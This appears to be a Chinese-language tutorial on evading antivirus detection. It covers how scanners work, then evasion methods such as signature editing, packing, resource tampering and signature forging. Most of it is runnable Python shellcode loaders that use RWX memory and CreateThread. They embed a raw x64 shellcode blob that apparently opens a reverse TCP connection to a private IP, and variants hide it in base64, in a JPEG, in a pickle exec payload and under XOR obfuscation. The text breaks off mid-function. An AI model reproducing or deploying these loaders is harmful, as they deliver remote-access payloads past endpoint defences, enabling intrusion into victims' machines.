# 介绍

## 免杀介绍

<b>免杀技术</b>全称为反杀毒技术Anti  Anti-Virus，简称免杀，它指的是一种能使病毒木马免于被杀毒软件查杀的技术，基本上都是修改病毒、木马的内容改变特征码，从而避开杀毒软件的查杀。

<b>为什么要进行免杀</b>

> 默认我们MSF/CS等生成的默认木马，其特征已经被各大杀毒软件给识别到了自己的木马病毒库

<b>什么是shellcode</b>

<mark>Shellcode</mark>是指能完成特殊任务的自包含的二进制代码，根据不同的任务可能是发出一条系统调用或者建立一个高权限的Shell，Shellcode由此得名。它的最终目的是取得目标机器的控制权，所以一般被攻击者利用系统的漏洞送入系统中执行，从而获取特殊权限的执行环境，或者给自己设立有特权的账户。

## 杀软介绍

<b>静态查杀</b>:查杀静态文件，一个病毒文件在编译生成之后，该文件本身就会有特征，比如文件的某个部分是由特定字符组成，杀软匹配到特殊字符则判断该文件为恶意文件。

<b>行为查杀</b>：程序的一些特定行为也会被杀软判定为恶意程序，如自删除、加入启动项、释放文件到特定目录、调用敏感的dll或程序、获取主机杀软运行状态等。

> VT查杀      https://www.virustotal.com/
>
> 微步沙箱等
>
> https://s.threatbook.com/
>
> https://www.virscan.org/

## 杀毒软件检测方式

### 扫描技术

1. 扫描压缩包技术：即是对压缩包案和封装文件作分析检查的技术。

2. 程序窜改防护：即是避免恶意程序借由删除杀毒侦测程序而大肆破坏电脑。

3. 修复技术：即是对恶意程序所损坏的文件进行还原

4. 急救盘杀毒：利用空白U盘制作急救启动盘，来检测电脑病毒。

5. 智能扫描：扫描最常用的磁盘，系统关键位置，耗时较短。

6. 全盘扫描：扫描电脑全部磁盘，耗时较长。

7. 勒索软件防护：保护电脑中的文件不被黑客恶意加密。

8. 开机扫描：当电脑开机时自动进行扫描，可以扫描压缩文档和可能不需要的程序

### 监控技术

1. 内存监控：当发现内存中存在病毒的时候，就会主动报警；监控所有进程；监控读取到内存中的文件；监控读取到内存的网络数据。

2. 文件监控：当发现写到磁盘上的文件中存在病毒，或者是被病毒感染，就会主动报警。

3. 邮件监控：当发现电子邮件的附件存在病毒时进行拦截。

4. 网页防护：阻止网络攻击和不安全下载。

5. 行为防护：提醒用户可疑的应用程序行为。

### 扫描引擎

#### 特征码扫描

<b>机制</b>:将扫描信息与病毒数据库（即所谓的“病毒特征库”）进行对照，如果信息与其中的任何一个病毒特征符合，杀毒软件就会判断此文件被病毒感染。杀毒软件在进行查杀的时候，会挑选文件内部的一段或者几段代码来作为它识别病毒的方式，这种代码叫做病毒的特征码；在病毒样本中，抽取特征代码；抽取的代码比较特殊，不太可能与普通正常程序代码吻合；抽取的代码要有适当长度，一方面维持特征代码的唯一性，另一方面保证病毒扫描时候不要有太大的空间和时间的开销。

<b>特征码类别</b>:

1. 文件特征码:对付病毒在文件中的存在方式：单一文件特征码、复合文件特征码（通过多处判断）
2. 内存特征码：对付病毒在内存中的存在方式：单一内存特征码、复合内存特征码

<b>优点</b>：速度快，配合高性能的扫描引擎，准确率相对比较高，误杀操作相对比较少；很少需要用户参与。

<b>缺点</b>：采用病毒特征代码法的检测工具，面对不断出现的新病毒，必须不断更新病毒库的版本，否则检测工具便会老化，逐渐失去实用价值；病毒特征代码法对从未见过的新病毒，无法知道其特征代码，因而无法去检测新病毒；病毒特征码如果没有经过充分的检验，可能会出现误报，数据误删，系统破坏，给用户带来麻烦。

#### 文件校验和法

对文件进行扫描后，可以将正常文件的内容，计算其校验和，将该校验和写入文件中或写入别的文件中保存；在文件使用过程中，定期地或每次使用文件前，检查文件现在内容算出的校验和与原来保存的校验和是否一致，因而可以发现文件是否感染病毒。

#### 进程行为监测法（沙盒模式）

机制：通过对病毒多年的观察、研究，有一些行为是病毒的共同行为，而且比较特殊，在正常程序中，这些行为比较罕见。当程序运行时，监视其进程的各种行为，如果发现了病毒行为，立即报警。

优缺点：

1. 优点：可发现未知病毒、可相当准确地预报未知的多数病毒；

2. 缺点：可能误报警、不能识别病毒名称、有一定实现难度、需要更多的用户参与判断；

#### 主动防御技术

主动防御并不需要病毒特征码支持，只要杀毒软件能分析并扫描到目标程序的行为，并根据预先设定的规则，判定是否应该进行清除操作 主动防御本来想领先于病毒，让杀毒软件自己变成安全工程师来分析病毒，从而达到以不变应万变的境界。但是，计算机的智能总是在一系列的规则下诞生，而普通用户的技术水平达不到专业分析病毒的水平，两者之间的博弈将主动防御推上一个尴尬境地。

#### 机器学习识别技术

机器学习识别技术既可以做静态样本的二进制分析，又可以运用在沙箱动态行为分析当中，是为内容/行为+算法模式。伴随着深度学习的急速发展，各家厂商也开始尝试运用深度学习技术来识别病毒特征，如瀚思科技的基于深度学习的二进制恶意样本检测



## 免杀技术介绍

### 1.修改特征码

免杀的最基本思想就是破坏特征，这个特征有可能是特征码，有可能是行为特征，只要破坏了病毒与木马所固有的特征，并保证其原有功能没有改变，一次免杀就能完成了。

> 特征码：能识别一个程序是一个病毒的一段不大于64字节的特征串

就目前的反病毒技术来讲，更改特征码从而达到免杀的效果事实上包含着两种方式。

一种是改特征码，这也是免杀的最初方法。例如一个文件在某一个地址内有“灰鸽子上线成功！”这么一句话，表明它就是木马，只要将相应地址内的那句话改成别的就可以了，如果是无关痛痒的，直接将其删掉也未尝不可。

第二种是针对目前推出的校验和查杀技术提出的免杀思想，它的原理虽然仍是特征码，但是已经脱离纯粹意义上特征码的概念，不过万变不离其宗。其实校验和也是根据病毒文件中与众不同的区块计算出来的，如果一个文件某个特定区域的校验和符合病毒库中的特征，那么反病毒软件就会报警。所以如果想阻止反病毒软件报警，只要对病毒的特定区域进行一定的更改，就会使这一区域的校验和改变，从而达到欺骗反病毒软件的目的。

修改特征码最重要的是定位特征码，但是定位了特征码修改后并不代表程序就能正常运行，费时费力，由于各个杀软厂商的特征库不同，所以一般也只能对一类的杀软起效果。虽然效果不好，但有时候在没有源码的情况下可以一用。

### 2.花指令免杀

花指令其实就是一段毫无意义的指令，也可以称之为垃圾指令。花指令是否存在对程序的执行结果没有影响，所以它存在的唯一目的就是阻止反汇编程序，或对反汇编设置障碍。

大多数反病毒软件是靠特征码来判断文件是否有毒的，而为了提高精度，现在的特征码都是在一定偏移量限制之内的，否则会对反病毒软件的效率产生严重的影响！而在黑客们为一个程序添加一段花指令之后，程序的部分偏移会受到影响，如果反病毒软件不能识别这段花指令，那么它检测特征码的偏移量会整体位移一段位置，自然也就无法正常检测木马了。

### 3.加壳免杀

说起软件加壳，简单地说，软件加壳其实也可以称为软件加密（或软件压缩），只是加密（或压缩）的方式与目的不一样罢了。壳就是软件所增加的保护，并不会破坏里面的程序结构，当我们运行这个加壳的程序时，系统首先会运行程序里的壳，然后由壳将加密的程序逐步还原到内存中，最后运行程序。

当我们运行这个加壳的程序时，系统首先会运行程序的“壳”，然后由壳将加密的程序逐步还原到内存中，最后运行程序。这样一来，在我们看来，似乎加壳之后的程序并没有什么变化，然而它却达到了加密的目的，这就是壳的作用。

加壳虽然对于特征码绕过有非常好的效果，加密壳基本上可以把特征码全部掩盖，但是缺点也非常的明显，因为壳自己也有特征。在某些比较流氓的国产杀软的检测方式下，主流的壳如VMP, Themida等，一旦被检测到加壳直接弹框告诉你这玩意儿有问题，虽然很直接，但是还是挺有效的。有些情况下，有的常见版本的壳会被直接脱掉分析。

面对这种情况可以考虑用一切冷门的加密壳，有时间精力的可以基于开源的压缩壳改一些源码，效果可能会很不错。

总得来说，加壳的方式来免杀还是比较实用的，特别是对于不开源的PE文件，通过加壳可以绕过很多特征码识别。

### 4.内存免杀

CPU不可能是为某一款加壳软件而特别设计的，因此某个软件被加壳后的可执行代码CPU是读不懂的。这就要求在执行外壳代码时，要先将原软件解密，并放到内存里，然后再通知CPU执行。

因为杀毒软件的内存扫描原理与硬盘上的文件扫描原理都是一样的，都是通过特征码比对的，只不过为了制造迷惑性，大多数反病毒公司的内存扫描与文件扫描采用的不是同一套特征码，这就导致了一个病毒木马同时拥有两套特征码，必须要将它们全部破坏掉才能躲过反病毒软件的查杀。

因此，除了加壳外，黑客们对抗反病毒软件的基本思路没变。而对于加壳，只要加一个会混淆程序原有代码的“猛”壳，其实还是能躲过杀毒软件的查杀的。



### 5.二次编译

metasploit的msfvenom提供了多种格式的payload和encoder，生成的shellcode也为二次加工提供了很大遍历，但是也被各大厂商盯得死死的。

而shikata_ga_nai是msf中唯一的评价是excellent的编码器，这种多态编码技术使得每次生成的攻击载荷文件是不一样的，编码和解码也都是不一样。还可以利用管道进行多重编码进行免杀。

目前msfvenom的encoder特征基本都进入了杀软的漏洞库，很难实现单一encoder编码而绕过杀软，所以对shellcode进行进一步修改编译成了msf免杀的主流。互联网上有很多借助于C、C#、python等语言对shellcode进行二次编码从而达到免杀的效果。



### 6.分离免杀

即将shellcode和加载器分离，加载器代码语言很多，例如C、Python、go语言等

### 7.资源修改

有些杀软会设置有扫描白名单，比如之前把程序图标替换为360安全卫士图标就能过360的查杀。

1. 加资源：

   > 使用ResHacker对文件进行资源操作，找来多个正常软件，将它们的资源加入到自己软件，如图片，版本信息，对话框等。

2. 替换资源:

   > 使用ResHacker替换无用的资源（Version等）。

3. 加签名：

   > 使用签名伪造工具，将正常软件的签名信息加入到自己软件中。

# 免杀

## 源加载



> [^1]:rwxpage = ctypes.windll.kernel32.VirtualAlloc(0,len(buf),0x3000,0x40)
> [^2]:ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(rwxpage),ctypes.create_string_buffer(buf),len(buf))
> [^3]:handle = ctypes.windll.kernel32.CreateThread(0,0,ctypes.c_uint64(rwxpage),0,0,0)
> [^4]:ctypes.windll.kernel32.WaitForSingleObject(handle,-1)

### 示例

64-c

```python
import ctypes
buf = b"shellcode"
#由于Pyhon在申请内存的时候默认是使用32位的，x86和x64的兼容性问题导致了内存不可写，如果系统是64位的，就要设置返回类型为C 64位 unsigned int
ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64
#申请内存
rwxpage = ctypes.windll.kernel32.VirtualAlloc(0,len(buf),0x3000,0x40)
#将shellcode加载进内存
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(rwxpage),ctypes.create_string_buffer(buf),len(buf))
#创建进程
handle = ctypes.windll.kernel32.CreateThread(0,0,ctypes.c_uint64(rwxpage),0,0,0)
#等待线程结束
ctypes.windll.kernel32.WaitForSingleObject(handle,-1)
```

### VirtualAlloc函数原型和参数如下[^1]

```c#
LPVOID VirtualAlloc{
LPVOID lpAddress,       #要分配的内存区域的地址
DWORD dwSize,           #分配的大小
DWORD flAllocationType, #分配的类型
DWORD flProtect         #该内存的初始保护属性
};
```

- ctypes.c_int(0)是NULL，系统将会决定分配内存区域的位置，并且按64KB向上取整
- ctypes.c_int(len(shellcode))以字节为单位分配或者保留多大区域
- ctypes.c_int(0x3000)是 MEM_COMMIT(0x1000) 和 MEM_RESERVE(0x2000)类型的合并
- ctypes.c_int(0x40)是权限为PAGE_EXECUTE_READWRITE 该区域可以执行代码，应用程序可以读写该区域

### RtlMoveMemory函数原型和参数如下[^2]

```c#
RtlMoveMemory(Destination,Source,Length);
Destination ：指向移动目的地址的指针。
Source ：指向要复制的内存地址的指针。
Length ：指定要复制的字节数。
```

### CreateThread将在主线程的基础上创建一个新线程[^3]

CreateThread函数原型和参数如下

```c#
HANDLE CreateThread(
LPSECURITY_ATTRIBUTES lpThreadAttributes,#线程安全属性
SIZE_T dwStackSize,                     #置初始栈的大小，以字节为单位
LPTHREAD_START_ROUTINE lpStartAddress,  #指向线程函数的指针
LPVOID lpParameter,                     #向线程函数传递的参数
DWORD dwCreationFlags,                  #线程创建属性
LPDWORD lpThreadId                      #保存新线程的id
)
```

创建一个线程从shellcode放置位置开始执行

```python
handle = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.c_uint64(ptr),
                                         ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.pointer(ctypes.c_int(0)))
```

- lpThreadAttributes 为NULL使用默认安全性
- dwStackSize为0，默认将使用与调用该函数的线程相同的栈空间大小
- lpStartAddress为ctypes.c_uint64(ptr)，定位到申请的内存所在的位置
- lpParameter不需传递参数时为NULL
- dwCreationFlags属性为0，表示创建后立即激活
- lpThreadId为ctypes.pointer(ctypes.c_int(0))不想返回线程ID,设置值为NULL

### 等待线程结束[^4]

WaitForSingleObject函数用来检测线程的状态

WaitForSingleObject函数原型和参数如下

```c#
DWORD WINAPI WaitForSingleObject(
__in HANDLE hHandle,    #对象句柄。可以指定一系列的对象
__in DWORD dwMilliseconds   #定时时间间隔
);
```

等待创建的线程运行结束

```python
ctypes.windll.kernel32.WaitForSingleObject(
                    ctypes.c_int(handle),
                    ctypes.c_int(-1)
                  
```

这里两个参数，一个是创建的线程，一个是等待时间，

当线程退出时会给出一个信号，函数收到后会结束程序。

当时间设置为0或超过等待时间，程序也会结束，所以线程也会跟着结束。

正常的话我们创建的线程是需要一直运行的，所以将时间设为负数，等待时间将成为无限等待，程序就不会结束。

## 编码+字符

<a href="shell_code.py">shell_code.py</a>

```python
import ctypes
import base64


def encode():
    buf = b'''\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50\x52\x48\x31\xd2\x51\x56\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x4d\x31\xc9\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\x50\xe3\x56\x48\xff\xc9\x4d\x31\xc9\x41\x8b\x34\x88\x48\x01\xd6\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x41\x58\x48\x01\xd0\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4b\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49\x89\xe5\x49\xbc\x02\x00\x0f\xa0\xc0\xa8\xfd\x64\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x41\x5e\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0a\x49\xff\xce\x75\xe5\xe8\x93\x00\x00\x00\x48\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9\x6a\x04\x41\x58\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7e\x55\x48\x83\xc4\x20\x5e\x89\xf6\x6a\x40\x41\x59\x68\x00\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31\xc9\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x41\x57\x59\x68\x00\x40\x00\x00\x41\x58\x6a\x00\x5a\x41\xba\x0b\x2f\x0f\x30\xff\xd5\x57\x59\x41\xba\x75\x6e\x4d\x61\xff\xd5\x49\xff\xce\xe9\x3c\xff\xff\xff\x48\x01\xc3\x48\x29\xc6\x48\x85\xf6\x75\xb4\x41\xff\xe7\x58\x6a\x00\x59\x49\xc7\xc2\xf0\xb5\xa2\x56\xff\xd5'''
    BASE = base64.b64encode(buf)
    print(BASE)
def decode():
    Base = '''/EiD5PDozAAAAEFRQVBSSDHSUVZlSItSYEiLUhhIi1IgTTHJSItyUEgPt0pKSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0ItIGESLQCBJAdBQ41ZI/8lNMclBizSISAHWSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEFYSAHQQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCAA+gwKj9ZEFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1WoKQV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ+UG6maV0Yf/VhcB0Ckn/znXl6JMAAABIg+wQSIniTTHJagRBWEiJ+UG6AtnIX//Vg/gAflVIg8QgXon2akBBWWgAEAAAQVhIifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//Vg/gAfShYQVdZaABAAABBWGoAWkGNAB6Cy8PMP/VV1lBunVuTWH/1Un/zuk8////SAHDSCnGSIX2dbRB/+dYagBZScNABfC8LWiVv/V'''
    re_base = Base.replace('NAB','')
    buf = base64.b64decode(re_base)
    ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64
    rwxpage = ctypes.windll.kernel32.VirtualAlloc(0,len(buf),0x3000,0x40)
    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(rwxpage),ctypes.create_string_buffer(buf),len(buf))
    handle = ctypes.windll.kernel32.CreateThread(0,0,ctypes.c_uint64(rwxpage),0,0,0)
    ctypes.windll.kernel32.WaitForSingleObject(handle,-1)
decode()

#无法免杀


```

## 分离免杀

思路：将shellcode注入到图片，然后将图片上传到本地或公网服务器上，然后通过py远程获取图片内容，找到shellcode获取进行加载

<a href="pic_inject.py">pic_inject.py</a>

```python
import base64
import ctypes

def inject():
    with open('key.jpg','rb+') as fp:
        #获取图片内容长度
        datalen = fp.read()
        print("起始位置:",len(datalen))
        #对写入base64加密shellcode
        data = b'''\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50\x52\x48\x31\xd2\x51\x56\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x4d\x31\xc9\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\x50\xe3\x56\x48\xff\xc9\x4d\x31\xc9\x41\x8b\x34\x88\x48\x01\xd6\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x41\x58\x48\x01\xd0\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4b\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49\x89\xe5\x49\xbc\x02\x00\x0f\xa0\xc0\xa8\xfd\x64\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x41\x5e\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0a\x49\xff\xce\x75\xe5\xe8\x93\x00\x00\x00\x48\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9\x6a\x04\x41\x58\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7e\x55\x48\x83\xc4\x20\x5e\x89\xf6\x6a\x40\x41\x59\x68\x00\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31\xc9\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x41\x57\x59\x68\x00\x40\x00\x00\x41\x58\x6a\x00\x5a\x41\xba\x0b\x2f\x0f\x30\xff\xd5\x57\x59\x41\xba\x75\x6e\x4d\x61\xff\xd5\x49\xff\xce\xe9\x3c\xff\xff\xff\x48\x01\xc3\x48\x29\xc6\x48\x85\xf6\x75\xb4\x41\xff\xe7\x58\x6a\x00\x59\x49\xc7\xc2\xf0\xb5\xa2\x56\xff\xd5'''
        response = base64.b64encode(data)
        fp.write(response)
#最终获取
def release():
    #读取图片获取
    with open('key.jpg',mode="rb") as f:
        f.seek(783373)   #从某个位置开始获取
        result = f.read()
    buf = base64.b64decode(result)
    ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64
    rwxpage = ctypes.windll.kernel32.VirtualAlloc(0,len(buf),0x3000,0x40)
    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(rwxpage),ctypes.create_string_buffer(buf),len(buf))
    handle = ctypes.windll.kernel32.CreateThread(0,0,ctypes.c_uint64(rwxpage),0,0,0)
    ctypes.windll.kernel32.WaitForSingleObject(handle,-1)
release()
#无法免杀
```

## 反序列化（可免杀）

它能够实现任意对象与文本之间的相互转化，也可以实现任意对象与二进制之间的相互转化

序列化：把python数据类型转化为json格式的字符串类型

反序列化：把json格式的字符类型转化为python的数据类型

> dumps():   将python中的对象序列化为二进制对象，并返回
>
> loads():     读取给定的二进制对象数据，并将其转换为Python对象

将base64编码后shellcode以及加载器进行序列化操作，并进行base64加密

<a href="serialize.py">serialize.py</a>

```py
import pickle
import base64
import ctypes
#buf的内容为shellcode的base64加密
shellcode='''
import ctypes,base64
buf=b'/EiD5PDozAAAAEFRQVBSSDHSZUiLUmBIi1IYSItSIFFWSA+3SkpNMclIi3JQSDHArDxhfAIsIEHByQ1BAcHi7VJIi1Igi0I8SAHQZoF4GAsCQVEPhXIAAACLgIgAAABIhcB0Z0gB0ESLQCCLSBhJAdBQ41ZNMclI/8lBizSISAHWSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCAA+gwKj9ZEFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1WoKQV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ+UG6maV0Yf/VhcB0Ckn/znXl6JMAAABIg+wQSIniTTHJagRBWEiJ+UG6AtnIX//Vg/gAflVIg8QgXon2akBBWWgAEAAAQVhIifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//Vg/gAfShYQVdZaABAAABBWGoAWkG6Cy8PMP/VV1lBunVuTWH/1Un/zuk8////SAHDSCnGSIX2dbRB/+dYagBZScfC8LWiVv/V'
buf = base64.b64decode(buf)
ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64
rwxpage = ctypes.windll.kernel32.VirtualAlloc(0,len(buf),0x3000,0x40)
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(rwxpage),ctypes.create_string_buffer(buf),len(buf))
handle = ctypes.windll.kernel32.CreateThread(0,0,ctypes.c_uint64(rwxpage),0,0,0)
ctypes.windll.kernel32.WaitForSingleObject(handle,-1)'''
class A(object):
        def __reduce__(self):
                return (exec,(shellcode,))
ret = pickle.dumps(A())

ret_base64 = base64.b64encode(ret)
print(ret_base64)

```

对得到的字符串反序列化，反序列化过程触发魔术方法\__reduce__

<a href="unserialize.py">unserialize.py</a>

```python
import base64,ctypes,pickle
code =b'gANjYnVpbHRpbnMKZXhlYwpxAFhVBAAACmltcG9ydCBjdHlwZXMsYmFzZTY0CmJ1Zj1iJy9FaUQ1UERvekFBQUFFRlJRVkJTU0RIU1pVaUxVbUJJaTFJWVNJdFNJRkZXU0ErM1NrcE5NY2xJaTNKUVNESEFyRHhoZkFJc0lFSEJ5UTFCQWNIaTdWSklpMUlnaTBJOFNBSFFab0Y0R0FzQ1FWRVBoWElBQUFDTGdJZ0FBQUJJaGNCMFowZ0IwRVNMUUNDTFNCaEpBZEJRNDFaTk1jbEkvOGxCaXpTSVNBSFdTREhBckVIQnlRMUJBY0U0NEhYeFRBTk1KQWhGT2RGMTJGaEVpMEFrU1FIUVprR0xERWhFaTBBY1NRSFFRWXNFaUVnQjBFRllRVmhlV1ZwQldFRlpRVnBJZyt3Z1FWTC80RmhCV1ZwSWl4THBTLy8vLzExSnZuZHpNbDh6TWdBQVFWWkppZVpJZ2V5Z0FRQUFTWW5sU2J3Q0FBK2d3S2o5WkVGVVNZbmtUSW54UWJwTWR5WUgvOVZNaWVwb0FRRUFBRmxCdWltQWF3RC8xV29LUVY1UVVFMHh5VTB4d0VqL3dFaUp3a2ovd0VpSndVRzY2Zy9mNFAvVlNJbkhhaEJCV0V5SjRraUorVUc2bWFWMFlmL1ZoY0IwQ2tuL3puWGw2Sk1BQUFCSWcrd1FTSW5pVFRISmFnUkJXRWlKK1VHNkF0bklYLy9WZy9nQWZsVklnOFFnWG9uMmFrQkJXV2dBRUFBQVFWaElpZkpJTWNsQnVsaWtVK1gvMVVpSncwbUp4MDB4eVVtSjhFaUoya2lKK1VHNkF0bklYLy9WZy9nQWZTaFlRVmRaYUFCQUFBQkJXR29BV2tHNkN5OFBNUC9WVjFsQnVuVnVUV0gvMVVuL3p1azgvLy8vU0FIRFNDbkdTSVgyZGJSQi8rZFlhZ0JaU2NmQzhMV2lWdi9WJwpidWYgPSBiYXNlNjQuYjY0ZGVjb2RlKGJ1ZikKY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5WaXJ0dWFsQWxsb2MucmVzdHlwZSA9IGN0eXBlcy5jX3VpbnQ2NApyd3hwYWdlID0gY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5WaXJ0dWFsQWxsb2MoMCxsZW4oYnVmKSwweDMwMDAsMHg0MCkKY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5SdGxNb3ZlTWVtb3J5KGN0eXBlcy5jX3VpbnQ2NChyd3hwYWdlKSxjdHlwZXMuY3JlYXRlX3N0cmluZ19idWZmZXIoYnVmKSxsZW4oYnVmKSkKaGFuZGxlID0gY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5DcmVhdGVUaHJlYWQoMCwwLGN0eXBlcy5jX3VpbnQ2NChyd3hwYWdlKSwwLDAsMCkKY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5XYWl0Rm9yU2luZ2xlT2JqZWN0KGhhbmRsZSwtMSlxAYVxAlJxAy4='
pickle.loads(base64.b64decode(code))

```





## 基于异或运算的加密（可免杀）

<a href="shellcode.py">unserialize.py</a>

```python
import base64
import random
import ctypes

def decode(shell_code,keys):
    shell_code_base64 = ''   #初始化shell_code
    random.seed(keys)   #设置随机种子,指定种子为keys
    code = shell_code.split(',')    #对shellcode处理，以逗号为分隔符输出数组
    for item in code:    #遍历
        item = int(item)
        shell_code_base64 += chr(item ^ random.randint(0, 255))   #seed相同，对应的每个随机数也是固定的
    return shell_code_base64     #返回字符串,为原来的shellcode内容

def fs_decode(funcs):
    fs_keys = '123'   #设置随机数种子
    func_codes = ''   #初始化
    random.seed(fs_keys)
    func_code = funcs.split(',')   #对传入的字符串以逗号为分割，返回数组
    for item in func_code:    #遍历
        item = int(item)
        func_codes += chr(item ^ random.randint(0, 255))    #异或运算
    return func_codes    #返回字符串

def encode(ShellCode,keys):
    random.seed(keys)  #设置随机种子
    ShellCode_2 = ''   #初始化
    for item in ShellCode:    #遍历
        #获取每个字符的ascii值并与0-255中一个数进行异或运算(相同为0，不同则为1)
        ShellCode_2 += str(ord(item) ^ random.randint(0, 255)) + ','
    ShellCode_2 = ShellCode_2.strip(',')   #得到一串字符串，例如’75,211,...‘,strip(',')移除头尾的逗号
    return ShellCode_2  #返回字符串,加密完成


def run(shellcode):
    #调用kernel32.dll动态链接库中的VirtualAlloc函数申请内存
